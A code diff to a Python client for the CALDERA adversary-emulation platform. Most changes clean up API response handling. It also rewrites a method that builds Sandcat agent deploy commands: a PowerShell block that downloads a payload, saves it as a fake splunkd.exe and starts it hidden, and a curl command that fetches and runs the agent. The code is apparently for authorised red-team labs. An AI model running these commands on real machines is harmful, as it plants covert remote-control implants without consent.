@@ -26,6 +26,8 @@ class CalderaClient:
 
         self.session = requests.Session()
         if self.api_key:
+            # CALDERA's REST API expects the KEY header. Keep Content-Type here
+            # so every JSON request is accepted consistently by /api/v2 routes.
             self.session.headers.update({
                 "KEY": self.api_key,
                 "Content-Type": "application/json"
@@ -44,13 +46,13 @@ class CalderaClient:
             )
             response.raise_for_status()
 
-            if response.text:
+            if response.text and response.text.strip():
                 return response.json()
 
             return {}
 
         except requests.exceptions.RequestException as e:
-            raise CalderaAPIError(f"Caldera API request failed: {e}")
+            raise CalderaAPIError(f"Caldera API request failed for {method} {url}: {e}")
 
         except ValueError:
             raise CalderaAPIError("Caldera returned a non-JSON response.")
@@ -74,6 +76,25 @@ class CalderaClient:
         if isinstance(value, str):
             return value.strip().lower() in {"true", "trusted", "yes", "1"}
         return bool(value)
+
+    def _unwrap_collection(self, value, keys):
+        """
+        CALDERA versions/plugins return lists either directly or under keys
+        such as agents, abilities, payloads, data, or objects. This keeps the
+        rest of the app independent from that small API shape difference.
+        """
+        if isinstance(value, list):
+            return value
+        if not isinstance(value, dict):
+            return []
+        for key in keys:
+            nested = value.get(key)
+            if isinstance(nested, list):
+                return nested
+        for nested in value.values():
+            if isinstance(nested, list):
+                return nested
+        return []
 
     def _agent_is_alive(self, agent):
         raw = agent.get("alive")
@@ -120,9 +141,7 @@ class CalderaClient:
 
     def get_agents_normalized(self):
         agents = self.list_agents()
-
-        if isinstance(agents, dict):
-            agents = agents.get("agents", [])
+        agents = self._unwrap_collection(agents, ("agents", "data", "objects"))
 
         return [self._normalise_agent(agent) for agent in agents or []]
 
@@ -160,9 +179,7 @@ class CalderaClient:
 
     def get_adversary_by_name(self, name):
         adversaries = self._request("GET", "/api/v2/adversaries")
-
-        if isinstance(adversaries, dict):
-            adversaries = adversaries.get("adversaries", [])
+        adversaries = self._unwrap_collection(adversaries, ("adversaries", "data", "objects"))
 
         for adv in adversaries:
             if adv.get("name", "").lower() == name.lower():
@@ -241,16 +258,12 @@ class CalderaClient:
     def get_agents(self):
         """Alias for list_agents() returning a list of agents."""
         agents = self.list_agents()
-        if isinstance(agents, dict):
-            return agents.get("agents", [])
-        return agents
+        return self._unwrap_collection(agents, ("agents", "data", "objects"))
 
     def get_adversaries(self):
         """Return list of adversaries."""
         adv = self._request("GET", "/api/v2/adversaries")
-        if isinstance(adv, dict):
-            return adv.get("adversaries", [])
-        return adv
+        return self._unwrap_collection(adv, ("adversaries", "data", "objects"))
 
     def status(self):
         try:
@@ -285,8 +298,7 @@ class CalderaClient:
         except CalderaAPIError:
             payloads = []
 
-        if isinstance(payloads, dict):
-            payloads = payloads.get("payloads", payloads.get("data", []))
+        payloads = self._unwrap_collection(payloads, ("payloads", "data", "objects"))
 
         names = []
         for payload in payloads or []:
@@ -300,36 +312,46 @@ class CalderaClient:
         return "sandcat.go"
 
     def generate_sandcat_command(self, kali_ip=None, group='red', platform='windows'):
-        """Return a simple deploy command string for Sandcat (informational).
-        This is a best-effort helper and intentionally non-destructive.
+        """
+        Return one copyable Sandcat deploy block.
+
+        The first variable is intentionally easy to edit because VM IPs change.
+        The comments are included in the copied command so users understand what
+        each part does before running it in an authorised lab target.
         """
         server = self._reachable_server_url(kali_ip)
         if not server:
             return (
-                "CALDERA server is configured as localhost. Set KALI_IP or CALDERA_URL "
-                "to an address reachable from the victim VM before deploying Sandcat."
+                "# CALDERA server is configured as localhost. Edit CALDERA_SERVER "
+                "to the Kali VM IP that the target can reach.\n"
+                "$CALDERA_SERVER=\"http://CHANGE-ME:8888\""
             )
         payload_name = self._sandcat_payload_name(platform)
 
         if "win" in str(platform or "").lower():
             return (
-                f"$server=\"{server}\";"
-                "$url=\"$server/file/download\";"
-                "$wc=New-Object System.Net.WebClient;"
-                "$wc.Headers.add(\"platform\",\"windows\");"
-                f"$wc.Headers.add(\"file\",\"{payload_name}\");"
-                "$data=$wc.DownloadData($url);"
-                "get-process | ? {$_.modules.filename -like \"C:\\Users\\Public\\splunkd.exe\"} | stop-process -f;"
-                "rm -force \"C:\\Users\\Public\\splunkd.exe\" -ea ignore;"
-                "[io.file]::WriteAllBytes(\"C:\\Users\\Public\\splunkd.exe\",$data) | Out-Null;"
-                f"Start-Process -FilePath C:\\Users\\Public\\splunkd.exe -ArgumentList \"-server $server -group {group}\" -WindowStyle hidden;"
+                f"# Edit this IP if your Kali VM address changes; it must be reachable from the target.\n"
+                f"$CALDERA_SERVER=\"{server}\";\n"
+                "# Download the official Sandcat payload from CALDERA.\n"
+                "$url=\"$CALDERA_SERVER/file/download\"; "
+                "$wc=New-Object System.Net.WebClient; "
+                "$wc.Headers.add(\"platform\",\"windows\"); "
+                f"$wc.Headers.add(\"file\",\"{payload_name}\"); "
+                "$data=$wc.DownloadData($url); "
+                "\n# Replace any old lab Sandcat copy, then start a fresh agent in the chosen group.\n"
+                "Get-Process | Where-Object {$_.Modules.FileName -like \"C:\\Users\\Public\\splunkd.exe\"} | Stop-Process -Force -ErrorAction SilentlyContinue; "
+                "Remove-Item -Force \"C:\\Users\\Public\\splunkd.exe\" -ErrorAction SilentlyContinue; "
+                "[IO.File]::WriteAllBytes(\"C:\\Users\\Public\\splunkd.exe\",$data) | Out-Null; "
+                f"Start-Process -FilePath C:\\Users\\Public\\splunkd.exe -ArgumentList \"-server $CALDERA_SERVER -group {group}\" -WindowStyle Hidden;"
             )
 
         return (
-            f"server='{server}'; "
-            f"curl -fsSL -H 'file:{payload_name}' -H 'platform:linux' \"$server/file/download\" -o sandcat; "
-            f"chmod +x sandcat; "
-            f"./sandcat -server \"$server\" -group {group}"
+            "# Edit this IP if your Kali VM address changes; it must be reachable from the target.\n"
+            f"CALDERA_SERVER='{server}';\n"
+            "# Download the official Sandcat payload from CALDERA.\n"
+            f"curl -fsSL -H 'file:{payload_name}' -H 'platform:linux' \"$CALDERA_SERVER/file/download\" -o sandcat; "
+            "\n# Start a fresh agent in the chosen group.\n"
+            f"chmod +x sandcat; ./sandcat -server \"$CALDERA_SERVER\" -group {group}"
         )
 
     def get_adversary_list(self):
